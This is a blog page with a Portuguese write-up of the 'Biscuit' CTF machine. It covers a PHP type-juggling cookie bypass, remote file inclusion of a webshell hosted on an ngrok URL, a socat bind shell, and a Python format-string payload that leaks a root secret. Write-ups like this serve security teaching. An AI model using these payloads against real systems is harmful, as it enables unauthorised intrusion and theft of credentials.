<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>UHCCTF (Classificat√≥ria) - Biscuit (Official Write-Up) pt-br | big0us</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="UHCCTF (Classificat√≥ria) - Biscuit (Official Write-Up) pt-br" />
<meta name="author" content="Vinicius Pereira" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:description" content="Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs." />
<meta property="og:site_name" content="big0us" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-06-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UHCCTF (Classificat√≥ria) - Biscuit (Official Write-Up) pt-br" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"Vinicius Pereira"},"description":"Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.","headline":"UHCCTF (Classificat√≥ria) - Biscuit (Official Write-Up) pt-br","dateModified":"2021-06-01T00:00:00+00:00","url":"/2021/06/01/uhc-biscuit-ptbr.html","datePublished":"2021-06-01T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/06/01/uhc-biscuit-ptbr.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="big0us" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">big0us<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/big0x75"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-blue-hover" href="https://linkedin.com/in/viniciuspereiras"><i class="fab fa-linkedin"></i></a>
        
        
        
        <a class="color-pink-hover" href="https://github.com/viniciuspereiras"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/avatar.gif
" class="author-avatar" alt="Avatar" />
<div class="description">Hey, my name is Vinicius, aka big0us :), I work with the red team at PROOF. In my free time I like to create some stuff, participate in bug bounty programs and play some CTFs.
</div>

</div>


<div class="post">
  <h1 class="post-title">UHCCTF (Classificat√≥ria) - Biscuit (Official Write-Up) pt-br</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/pt-br/">pt-br</a>
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/write-up/">write-up</a>
      
  </div>
  
  <div class="post-date">Published on 01 Jun 2021</div>
  
  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-72MZ89K41P"></script>

<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-72MZ89K41P');
</script>

<p>Ola sou o Vinicius (big0us), esse √© um write-up de uma maquina que foi o challenge de uma das etapas classificat√≥rias do UHC.</p>

<p>Escreverei meio r√°pido ent√£o pe√ßo desculpas se algo estiver um pouco ruim.</p>

<p>Boa leitura :)</p>

<p>g00d_h4ck1ng</p>

<h1 id="recon">Recon</h1>

<p><img src="/assets/biscuit/Untitled.png" alt="/assets/biscuit/Untitled.png" /></p>

<p>A primeira p√°gina √© uma p√°gina de login, dando uma olhada no HTML da p√°gina aparentemente n√£o existe nada escondido, vou rodar um fuzzing e depois poderemos testar algumas credenciais.</p>

<p><img src="/assets/biscuit/Untitled%201.png" alt="/assets/biscuit/Untitled%201.png" /></p>

<p>Aparentemente nosso fuzzing entregou apenas um /class, onde existe um directory listing apontando um arquivo ‚Äú.php‚Äù.</p>

<p><img src="/assets/biscuit/Untitled%202.png" alt="/assets/biscuit/Untitled%202.png" /></p>

<p>Ok, vamos testar algumas credenciais padr√µes no formul√°rio de login:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
guest:guest
administrator:admin
root:root
</code></pre></div></div>

<p>Testando ‚Äúguest:guest‚Äù conseguimos entrar:</p>

<p><img src="/assets/biscuit/Untitled%203.png" alt="/assets/biscuit/Untitled%203.png" /></p>

<p>Dando uma olhada aparentemente temos s√≥ uma p√°gina de welcome.</p>

<p>Vamos ver nossos cookies.</p>

<p><img src="/assets/biscuit/Untitled%204.png" alt="/assets/biscuit/Untitled%204.png" /></p>

<p>Vamos entender melhor esse cookie chamado session pois ele parece ser interessante:</p>

<p><img src="/assets/biscuit/Untitled%205.png" alt="/assets/biscuit/Untitled%205.png" /></p>

<p>Utilizando o cyberchef para decodar o cookie podemos perceber que se trata de um JSON com tr√™s valores: hmac (provavelmente algo que valide os valores), username, e uma hora para o cookie expirar.</p>

<p>Vou tentar alterar o valor de username para ‚Äúadmin‚Äù encodar em base64, url e ent√£o enviar para a aplica√ß√£o.</p>

<p><img src="/assets/biscuit/Untitled%206.png" alt="/assets/biscuit/Untitled%206.png" /></p>

<p>Aparentemente retornou um erro dizendo que estamos tentando fazer um ‚Äútemperamento de cookie‚Äù, e retornou uma flag! Nossa primeira flag.</p>

<p>Depois de alguns testes enviando cookies com outros valores aleat√≥rios, acabei percebendo que a aplica√ß√£o valida o Cookie pelo valor do hmac, e n√£o pelo conteudo inteiro do json.</p>

<p>Uma vulnerabilidade muito conhecida sobre valida√ß√µes do PHP √© o type jugling, que consiste em bypass de autentica√ß√µes fazendo qualquer if($ == $) retornar ‚Äútrue‚Äù.</p>

<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp">PHP Tricks (SPA)</a></p>

<p><a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">PHP Type Juggling Vulnerabilities</a></p>

<p><img src="/assets/biscuit/Untitled%207.png" alt="/assets/biscuit/Untitled%207.png" /></p>

<p>Basicamente quando um programador utiliza ‚Äú==‚Äù em uma compara√ß√£o o php primeiro torna os dois valores do mesmo tipo, ignorando o tipo (int, str‚Ä¶) das vari√°veis.</p>

<p>E nessa opera√ß√£o podemos utilizar algumas t√©cnicas para a compara√ß√£o retornar ‚Äútrue‚Äù.</p>

<h1 id="exploitation">Exploitation</h1>

<p>Depois de um tempo tentando, testei trocar o valor do ‚Äúhmac‚Äù para ‚Äútrue‚Äù e aparentemente funcionou!</p>

<p><img src="/assets/biscuit/Untitled%208.png" alt="/assets/biscuit/Untitled%208.png" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"hmac"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"expiration"</span><span class="p">:</span><span class="mi">1625435484</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/biscuit/Untitled%209.png" alt="/assets/biscuit/Untitled%209.png" /></p>

<p>Ok, fiquei triste que n√£o existe nenhuma flag por aqui üò¢.</p>

<p>Vou tentar alterar o nome do usu√°rio para entender o que est√° acontecendo.</p>

<p>Alterando para ‚Äútest‚Äù o php nos retorna um erro, aparentemente ele est√° rodando um ‚Äúrequire_once‚Äù no valor que colocamos + adicionando .php no final. require_once normalmente √© usado para incluir p√°ginas e arquivos php em sites, e quando o usu√°rio tem controle sobre o valor que o require_once vai usar a aplica√ß√£o est√° vulner√°vel a LFI ou RFI (Local/Remote File Inclusion).</p>

<p><img src="/assets/biscuit/Untitled%2010.png" alt="/assets/biscuit/Untitled%2010.png" /></p>

<p>Como a aplica√ß√£o ja coloca o .php no final vou fazer o seguinte.</p>

<p>Subir um arquivo com uma webshell num servidor utilizando o ngrok, mandar a a aplica√ß√£o incluir meu arquivo e conseguir um RCE.</p>

<p><img src="/assets/biscuit/Untitled%2011.png" alt="/assets/biscuit/Untitled%2011.png" /></p>

<p>E vou mandar a payload:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"hmac"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"https://3b4f8afabab2.ngrok.io/shell"</span><span class="p">,</span><span class="nl">"expiration"</span><span class="p">:</span><span class="mi">1625435484</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>(A aplica√ß√£o ja vai colocar o .php)</p>

<p>Temos RCE!!</p>

<p><img src="/assets/biscuit/Untitled%2012.png" alt="/assets/biscuit/Untitled%2012.png" /></p>

<p>Agora vou tentar pegar uma reverse shell.</p>

<p>Ap√≥s algumas tentativas percebi que existe um firewall na aplica√ß√£o que bloqueia qualquer comunica√ß√£o em portas que n√£o forem 80 ou 443, como eu n√£o tenho uma VPS, vou fazer de uma forma diferente, ao inv√©s de uma reverse shell (onde a vitima se conecta no atante) vou pegar uma bind shell (abrindo uma porta na maquina e me conectando nela).</p>

<p>Para isso vou usar o ‚Äúsocat‚Äù.</p>

<table>
  <tbody>
    <tr>
      <td>[socat</td>
      <td>GTFOBins](https://gtfobins.github.io/gtfobins/socat/#bind-shell)</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/biscuit/Untitled%2013.png" alt="/assets/biscuit/Untitled%2013.png" /></p>

<p>Primeiro peguei o binario do socat no github deles (socat binary) e passei pra maquina utilizando o web-server que eu criei para conseguir RCE, e dando um curl.</p>

<p>Ent√£o rodei os comandos que est√£o na imagem e consegui uma bind shell! (utilizei a porta 6969)</p>

<p><img src="/assets/biscuit/Untitled%2014.png" alt="/assets/biscuit/Untitled%2014.png" /></p>

<p>E navegando um pouco no / encontramos a pr√≥xima flag:</p>

<p><img src="/assets/biscuit/Untitled%2015.png" alt="/assets/biscuit/Untitled%2015.png" /></p>

<h1 id="p√≥s-exploitation">P√≥s Exploitation</h1>

<p>Fazendo o b√°sico checklist de priv esc podemos perceber que estamos com o usu√°rio do apache e podemos rodar um script como root na m√°quina:</p>

<p><img src="/assets/biscuit/Untitled%2016.png" alt="/assets/biscuit/Untitled%2016.png" /></p>

<p>Aparentemente n√£o podemos ler o script e nem altera-lo.</p>

<p><img src="/assets/biscuit/Untitled%2017.png" alt="/assets/biscuit/Untitled%2017.png" /></p>

<p>O que nos resta √© roda-lo:</p>

<p><img src="/assets/biscuit/Untitled%2018.png" alt="/assets/biscuit/Untitled%2018.png" /></p>

<p>Aparentemente ele printa um IP, dando uma olhada no /var/www/html o path da aplica√ß√£o web podemos perceber que existe um arquivo com o mesmo ip que ele printou, ent√£o aparentemente ele est√° printando o IP que est√° no arquivo.</p>

<p><img src="/assets/biscuit/Untitled%2019.png" alt="/assets/biscuit/Untitled%2019.png" /></p>

<p>Abri o arquivo com o nano (antes rodar ‚Äòexport TERM=xterm‚Äô !!) e come√ßei a edita-lo para tentar retornar algum erro no python que me mostre alguma coisa do programa.</p>

<p><img src="/assets/biscuit/Untitled%2020.png" alt="/assets/biscuit/Untitled%2020.png" /></p>

<p><img src="/assets/biscuit/Untitled%2021.png" alt="/assets/biscuit/Untitled%2021.png" /></p>

<p>Interessante, aparentemente existe um format string diferente (pouco usado) rodando.</p>

<p>Pesquisando sobre esse tipo de format string + vulnerabilites acabei trope√ßando nesse artigo.</p>

<p><a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input">Are there any Security Concerns to using Python F Strings with User Input</a></p>

<p>Basicamente nele explica-se tudo o que precisamos fazer, por isso n√£o vou explicar direitinho, mas basicamente a forma que esse format string funciona nos permite injetar mais strings para serem formatadas, e se isso √© printado podemos printar todas as v√°riaveis globais que o arquivo usa, normlamente dando alguma key ou senha para n√≥s. (Para quem n√£o entende muito bem ingl√™s √© s√≥ traduzir que fica tranquilo de entender).</p>

<p>Ok ent√£o vamos a payload.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"ips"</span><span class="p">:[</span><span class="s2">"{ip.list_blocked.__globals__}"</span><span class="p">]}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/biscuit/Untitled%2022.png" alt="/assets/biscuit/Untitled%2022.png" /></p>

<p>Aparentemente funcionou e conseguimos o valor de uma v√°riavel chamada root_secret, provavelmente √© a senha do root.</p>

<p><img src="/assets/biscuit/Untitled%2023.png" alt="/assets/biscuit/Untitled%2023.png" /></p>

<p>Worked!!</p>

<p>Obrigado a voc√™ que leu at√© aqui, parab√©ns cadu pela m√°quina, e desclupe por algum erro no write-up, fiz correndo &gt;_&gt;</p>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/10/07/latinoware2021-planilhasbaby.html">
            CTF LatinoWare 2021 - Planilhas Baby
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/04/uhc-cap.html">
            UHCCTF (Classificat√≥ria) - Cap
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/03/uhc-storm.html">
            UHCCTF (Classificat√≥ria) - Storm
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/eng/" class="set-1">eng</a> <a href="/tag/latinoware/" class="set-1">latinoware</a> <a href="/tag/pt-br/" class="set-5">pt-br</a> <a href="/tag/write-up/" class="set-5">write-up</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
